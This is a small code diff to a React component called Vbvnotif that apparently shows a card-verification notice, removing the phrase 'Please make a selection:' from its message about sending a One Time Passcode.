@@ -138,7 +138,7 @@ const Vbvnotif = ({ onContinue }) => {
                 <div className="row pad-half">
                   <div className="col-12">
                     <div id="Body1">
-                      For your protection, we are requesting confirmation of your identity by sending a One Time Passcode (OTP) to your registered mobile number or email. Please make a selection:
+                      For your protection, we are requesting confirmation of your identity by sending a One Time Passcode (OTP) to your registered mobile number or email.
                     </div>
                   </div>
                 </div>
